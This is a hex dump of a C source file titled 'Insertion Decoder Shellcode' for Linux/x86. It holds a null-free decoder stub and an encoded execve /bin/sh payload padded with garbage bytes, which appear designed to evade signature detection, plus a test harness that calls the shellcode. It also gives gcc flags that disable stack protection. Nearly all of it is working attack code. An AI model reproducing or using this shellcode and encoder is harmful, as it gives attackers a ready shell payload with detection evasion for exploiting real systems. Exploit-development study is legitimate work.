00000000  2f 2a 0a 0a 20 49 6e 73  65 72 74 69 6f 6e 20 44  |/*.. Insertion D|
00000010  65 63 6f 64 65 72 20 53  68 65 6c 6c 63 6f 64 65  |ecoder Shellcode|
00000020  20 2d 20 43 20 4c 61 6e  67 75 61 67 65 20 2d 20  | - C Language - |
00000030  4c 69 6e 75 78 2f 78 38  36 0a 20 43 6f 70 79 72  |Linux/x86. Copyr|
00000040  69 67 68 74 20 28 43 29  20 32 30 31 33 20 47 65  |ight (C) 2013 Ge|
00000050  79 73 6c 61 6e 20 47 2e  20 42 65 6d 2c 20 48 61  |yslan G. Bem, Ha|
00000060  63 6b 69 6e 67 20 62 69  74 73 0a 0a 20 20 20 68  |cking bits..   h|
00000070  74 74 70 3a 2f 2f 68 61  63 6b 69 6e 67 62 69 74  |ttp://hackingbit|
00000080  73 2e 63 6f 6d 0a 20 20  20 67 65 79 73 6c 61 6e  |s.com.   geyslan|
00000090  40 67 6d 61 69 6c 2e 63  6f 6d 0a 0a 20 54 68 69  |@gmail.com.. Thi|
000000a0  73 20 70 72 6f 67 72 61  6d 20 69 73 20 66 72 65  |s program is fre|
000000b0  65 20 73 6f 66 74 77 61  72 65 3a 20 79 6f 75 20  |e software: you |
000000c0  63 61 6e 20 72 65 64 69  73 74 72 69 62 75 74 65  |can redistribute|
000000d0  20 69 74 20 61 6e 64 2f  6f 72 20 6d 6f 64 69 66  | it and/or modif|
000000e0  79 0a 20 69 74 20 75 6e  64 65 72 20 74 68 65 20  |y. it under the |
000000f0  74 65 72 6d 73 20 6f 66  20 74 68 65 20 47 4e 55  |terms of the GNU|
00000100  20 47 65 6e 65 72 61 6c  20 50 75 62 6c 69 63 20  | General Public |
00000110  4c 69 63 65 6e 73 65 20  61 73 20 70 75 62 6c 69  |License as publi|
00000120  73 68 65 64 20 62 79 0a  20 74 68 65 20 46 72 65  |shed by. the Fre|
00000130  65 20 53 6f 66 74 77 61  72 65 20 46 6f 75 6e 64  |e Software Found|
00000140  61 74 69 6f 6e 2c 20 65  69 74 68 65 72 20 76 65  |ation, either ve|
00000150  72 73 69 6f 6e 20 33 20  6f 66 20 74 68 65 20 4c  |rsion 3 of the L|
00000160  69 63 65 6e 73 65 2c 20  6f 72 0a 20 28 61 74 20  |icense, or. (at |
00000170  79 6f 75 72 20 6f 70 74  69 6f 6e 29 20 61 6e 79  |your option) any|
00000180  20 6c 61 74 65 72 20 76  65 72 73 69 6f 6e 2e 0a  | later version..|
00000190  0a 20 54 68 69 73 20 70  72 6f 67 72 61 6d 20 69  |. This program i|
000001a0  73 20 64 69 73 74 72 69  62 75 74 65 64 20 69 6e  |s distributed in|
000001b0  20 74 68 65 20 68 6f 70  65 20 74 68 61 74 20 69  | the hope that i|
000001c0  74 20 77 69 6c 6c 20 62  65 20 75 73 65 66 75 6c  |t will be useful|
000001d0  2c 0a 20 62 75 74 20 57  49 54 48 4f 55 54 20 41  |,. but WITHOUT A|
000001e0  4e 59 20 57 41 52 52 41  4e 54 59 3b 20 77 69 74  |NY WARRANTY; wit|
000001f0  68 6f 75 74 20 65 76 65  6e 20 74 68 65 20 69 6d  |hout even the im|
00000200  70 6c 69 65 64 20 77 61  72 72 61 6e 74 79 20 6f  |plied warranty o|
00000210  66 0a 20 4d 45 52 43 48  41 4e 54 41 42 49 4c 49  |f. MERCHANTABILI|
00000220  54 59 20 6f 72 20 46 49  54 4e 45 53 53 20 46 4f  |TY or FITNESS FO|
00000230  52 20 41 20 50 41 52 54  49 43 55 4c 41 52 20 50  |R A PARTICULAR P|
00000240  55 52 50 4f 53 45 2e 20  20 53 65 65 20 74 68 65  |URPOSE.  See the|
00000250  0a 20 47 4e 55 20 47 65  6e 65 72 61 6c 20 50 75  |. GNU General Pu|
00000260  62 6c 69 63 20 4c 69 63  65 6e 73 65 20 66 6f 72  |blic License for|
00000270  20 6d 6f 72 65 20 64 65  74 61 69 6c 73 2e 0a 0a  | more details...|
00000280  20 59 6f 75 20 73 68 6f  75 6c 64 20 68 61 76 65  | You should have|
00000290  20 72 65 63 65 69 76 65  64 20 61 20 63 6f 70 79  | received a copy|
000002a0  20 6f 66 20 74 68 65 20  47 4e 55 20 47 65 6e 65  | of the GNU Gene|
000002b0  72 61 6c 20 50 75 62 6c  69 63 20 4c 69 63 65 6e  |ral Public Licen|
000002c0  73 65 0a 20 61 6c 6f 6e  67 20 77 69 74 68 20 74  |se. along with t|
000002d0  68 69 73 20 70 72 6f 67  72 61 6d 2e 20 20 49 66  |his program.  If|
000002e0  20 6e 6f 74 2c 20 73 65  65 20 3c 68 74 74 70 3a  | not, see <http:|
000002f0  2f 2f 77 77 77 2e 67 6e  75 2e 6f 72 67 2f 6c 69  |//www.gnu.org/li|
00000300  63 65 6e 73 65 73 2f 3e  2e 0a 0a 2a 2f 0a 0a 2f  |censes/>...*/../|
00000310  2a 0a 0a 20 20 20 69 6e  73 65 72 74 69 6f 6e 5f  |*..   insertion_|
00000320  64 65 63 6f 64 65 72 5f  73 68 65 6c 6c 63 6f 64  |decoder_shellcod|
00000330  65 0a 0a 20 20 2a 20 64  65 63 6f 64 65 72 20 68  |e..  * decoder h|
00000340  61 73 20 33 33 20 62 79  74 65 73 20 28 74 68 65  |as 33 bytes (the|
00000350  20 66 69 6e 61 6c 20 61  6d 6f 75 6e 74 20 64 65  | final amount de|
00000360  70 65 6e 64 73 20 6f 6e  20 74 68 65 20 73 68 65  |pends on the she|
00000370  6c 6c 63 6f 64 65 20 6c  65 6e 67 74 68 20 70 6c  |llcode length pl|
00000380  75 73 20 67 61 72 62 61  67 65 20 62 79 74 65 73  |us garbage bytes|
00000390  29 0a 20 20 2a 20 6e 75  6c 6c 2d 66 72 65 65 0a  |).  * null-free.|
000003a0  20 20 2a 20 64 65 63 6f  64 65 73 20 61 6e 79 20  |  * decodes any |
000003b0  70 61 74 74 65 72 6e 20  6f 66 20 67 61 72 62 61  |pattern of garba|
000003c0  67 65 20 69 6e 73 65 72  74 69 6f 6e 0a 20 20 20  |ge insertion.   |
000003d0  20 20 20 45 67 3a 20 54  72 75 65 20 42 79 74 65  |   Eg: True Byte|
000003e0  20 3d 20 58 2c 20 47 61  72 62 61 67 65 20 42 79  | = X, Garbage By|
000003f0  74 65 20 3d 20 5f 0a 20  20 20 20 20 20 20 20 20  |te = _.         |
00000400  20 20 5f 20 58 20 5f 20  58 20 5f 20 2e 2e 2e 0a  |  _ X _ X _ ....|
00000410  20 20 20 20 20 20 20 20  20 20 20 58 20 5f 20 5f  |           X _ _|
00000420  20 58 20 58 20 2e 2e 2e  0a 20 20 20 20 20 20 20  | X X ....       |
00000430  20 20 20 20 58 20 58 20  58 20 5f 20 5f 20 2e 2e  |    X X X _ _ ..|
00000440  2e 20 0a 0a 0a 20 20 20  23 20 67 63 63 20 2d 6d  |. ...   # gcc -m|
00000450  33 32 20 2d 66 6e 6f 2d  73 74 61 63 6b 2d 70 72  |32 -fno-stack-pr|
00000460  6f 74 65 63 74 6f 72 20  2d 7a 20 65 78 65 63 73  |otector -z execs|
00000470  74 61 63 6b 20 69 6e 73  65 72 74 69 6f 6e 5f 64  |tack insertion_d|
00000480  65 63 6f 64 65 72 5f 73  68 65 6c 6c 63 6f 64 65  |ecoder_shellcode|
00000490  2e 63 20 2d 6f 20 69 6e  73 65 72 74 69 6f 6e 5f  |.c -o insertion_|
000004a0  64 65 63 6f 64 65 72 5f  73 68 65 6c 6c 63 6f 64  |decoder_shellcod|
000004b0  65 0a 0a 20 20 20 54 65  73 74 69 6e 67 0a 20 20  |e..   Testing.  |
000004c0  20 23 20 2e 2f 69 6e 73  65 72 74 69 6f 6e 5f 64  | # ./insertion_d|
000004d0  65 63 6f 64 65 72 5f 73  68 65 6c 6c 63 6f 64 65  |ecoder_shellcode|
000004e0  0a 0a 2a 2f 0a 0a 0a 23  69 6e 63 6c 75 64 65 20  |..*/...#include |
000004f0  3c 73 74 64 69 6f 2e 68  3e 0a 23 69 6e 63 6c 75  |<stdio.h>.#inclu|
00000500  64 65 20 3c 73 74 72 69  6e 67 2e 68 3e 0a 0a 75  |de <string.h>..u|
00000510  6e 73 69 67 6e 65 64 20  63 68 61 72 20 73 68 65  |nsigned char she|
00000520  6c 6c 63 6f 64 65 5b 5d  20 3d 20 5c 0a 0a 2f 2f  |llcode[] = \..//|
00000530  20 53 68 65 6c 6c 63 6f  64 65 20 44 65 63 6f 64  | Shellcode Decod|
00000540  65 72 20 28 33 33 20 62  79 74 65 73 29 0a 22 5c  |er (33 bytes)."\|
00000550  78 65 62 5c 78 31 61 5c  78 35 65 5c 78 38 64 5c  |xeb\x1a\x5e\x8d\|
00000560  78 33 65 5c 78 33 31 5c  78 63 39 5c 78 38 62 5c  |x3e\x31\xc9\x8b\|
00000570  78 31 63 5c 78 30 65 22  0a 22 5c 78 34 31 5c 78  |x1c\x0e"."\x41\x|
00000580  36 36 5c 78 38 31 5c 78  66 62 22 0a 22 5c 78 66  |66\x81\xfb"."\xf|
00000590  31 5c 78 66 31 22 20 20  20 20 20 20 20 20 2f 2f  |1\xf1"        //|
000005a0  20 3c 2d 20 45 6e 64 20  53 69 67 6e 61 74 75 72  | <- End Signatur|
000005b0  65 0a 22 5c 78 37 34 5c  78 30 66 5c 78 38 30 5c  |e."\x74\x0f\x80\|
000005c0  78 66 62 22 0a 22 5c 78  33 66 22 20 20 20 20 20  |xfb"."\x3f"     |
000005d0  20 20 20 20 20 20 20 2f  2f 20 3c 2d 20 47 61 72  |       // <- Gar|
000005e0  62 61 67 65 20 42 79 74  65 0a 22 5c 78 37 34 5c  |bage Byte."\x74\|
000005f0  78 66 30 5c 78 38 38 5c  78 31 66 5c 78 34 37 5c  |xf0\x88\x1f\x47\|
00000600  78 65 62 5c 78 65 62 5c  78 65 38 5c 78 65 31 5c  |xeb\xeb\xe8\xe1\|
00000610  78 66 66 22 0a 22 5c 78  66 66 5c 78 66 66 22 0a  |xff"."\xff\xff".|
00000620  0a 2f 2f 20 45 6e 63 6f  64 65 64 20 73 68 65 6c  |.// Encoded shel|
00000630  6c 63 6f 64 65 20 28 6c  65 6e 67 74 68 20 64 65  |lcode (length de|
00000640  70 65 6e 64 73 20 6f 66  20 74 68 65 20 73 68 65  |pends of the she|
00000650  6c 6c 63 6f 64 65 20 70  6c 75 73 20 67 61 72 62  |llcode plus garb|
00000660  61 67 65 20 62 79 74 65  73 29 0a 22 5c 78 33 66  |age bytes)."\x3f|
00000670  5c 78 33 66 5c 78 33 66  5c 78 33 31 5c 78 33 66  |\x3f\x3f\x31\x3f|
00000680  5c 78 63 39 5c 78 33 66  5c 78 66 37 5c 78 65 31  |\xc9\x3f\xf7\xe1|
00000690  5c 78 33 66 22 0a 22 5c  78 62 30 5c 78 30 62 5c  |\x3f"."\xb0\x0b\|
000006a0  78 33 66 5c 78 35 31 5c  78 36 38 5c 78 33 66 5c  |x3f\x51\x68\x3f\|
000006b0  78 32 66 5c 78 32 66 5c  78 33 66 5c 78 37 33 22  |x2f\x2f\x3f\x73"|
000006c0  0a 22 5c 78 36 38 5c 78  33 66 5c 78 36 38 5c 78  |."\x68\x3f\x68\x|
000006d0  32 66 5c 78 33 66 5c 78  36 32 5c 78 36 39 5c 78  |2f\x3f\x62\x69\x|
000006e0  33 66 5c 78 36 65 5c 78  38 39 22 0a 22 5c 78 33  |3f\x6e\x89"."\x3|
000006f0  66 5c 78 65 33 5c 78 63  64 5c 78 33 66 5c 78 38  |f\xe3\xcd\x3f\x8|
00000700  30 5c 78 66 31 5c 78 66  31 22 3b 0a 0a 0a 6d 61  |0\xf1\xf1";...ma|
00000710  69 6e 20 28 29 0a 7b 0a  0a 20 20 20 20 20 20 20  |in ().{..       |
00000720  20 2f 2f 20 57 68 65 6e  20 63 6f 6e 74 61 69 6e  | // When contain|
00000730  73 20 6e 75 6c 6c 20 62  79 74 65 73 2c 20 70 72  |s null bytes, pr|
00000740  69 6e 74 66 20 77 69 6c  6c 20 73 68 6f 77 20 61  |intf will show a|
00000750  20 77 72 6f 6e 67 20 73  68 65 6c 6c 63 6f 64 65  | wrong shellcode|
00000760  20 6c 65 6e 67 74 68 2e  0a 0a 09 70 72 69 6e 74  | length....print|
00000770  66 28 22 53 68 65 6c 6c  63 6f 64 65 20 4c 65 6e  |f("Shellcode Len|
00000780  67 74 68 3a 20 20 25 64  5c 6e 22 2c 20 73 74 72  |gth:  %d\n", str|
00000790  6c 65 6e 28 73 68 65 6c  6c 63 6f 64 65 29 29 3b  |len(shellcode));|
000007a0  0a 0a 09 2f 2f 20 50 6f  6c 6c 75 74 65 73 20 61  |...// Pollutes a|
000007b0  6c 6c 20 72 65 67 69 73  74 65 72 73 20 65 6e 73  |ll registers ens|
000007c0  75 72 69 6e 67 20 74 68  61 74 20 74 68 65 20 73  |uring that the s|
000007d0  68 65 6c 6c 63 6f 64 65  20 72 75 6e 73 20 69 6e  |hellcode runs in|
000007e0  20 61 6e 79 20 63 69 72  63 75 6d 73 74 61 6e 63  | any circumstanc|
000007f0  65 2e 0a 0a 09 5f 5f 61  73 6d 5f 5f 20 28 22 6d  |e....__asm__ ("m|
00000800  6f 76 6c 20 24 30 78 66  66 66 66 66 66 66 66 2c  |ovl $0xffffffff,|
00000810  20 25 65 61 78 5c 6e 5c  74 22 0a 09 09 20 22 6d  | %eax\n\t"... "m|
00000820  6f 76 6c 20 25 65 61 78  2c 20 25 65 62 78 5c 6e  |ovl %eax, %ebx\n|
00000830  5c 74 22 0a 09 09 20 22  6d 6f 76 6c 20 25 65 61  |\t"... "movl %ea|
00000840  78 2c 20 25 65 63 78 5c  6e 5c 74 22 0a 09 09 20  |x, %ecx\n\t"... |
00000850  22 6d 6f 76 6c 20 25 65  61 78 2c 20 25 65 64 78  |"movl %eax, %edx|
00000860  5c 6e 5c 74 22 0a 09 09  20 22 6d 6f 76 6c 20 25  |\n\t"... "movl %|
00000870  65 61 78 2c 20 25 65 73  69 5c 6e 5c 74 22 0a 09  |eax, %esi\n\t"..|
00000880  09 20 22 6d 6f 76 6c 20  25 65 61 78 2c 20 25 65  |. "movl %eax, %e|
00000890  64 69 5c 6e 5c 74 22 0a  09 09 20 22 6d 6f 76 6c  |di\n\t"... "movl|
000008a0  20 25 65 61 78 2c 20 25  65 62 70 5c 6e 5c 74 22  | %eax, %ebp\n\t"|
000008b0  0a 0a 09 09 20 2f 2f 20  43 61 6c 6c 69 6e 67 20  |.... // Calling |
000008c0  74 68 65 20 73 68 65 6c  6c 63 6f 64 65 0a 09 09  |the shellcode...|
000008d0  20 22 63 61 6c 6c 20 73  68 65 6c 6c 63 6f 64 65  | "call shellcode|
000008e0  22 29 3b 0a 0a 7d                                 |");..}|
000008e6
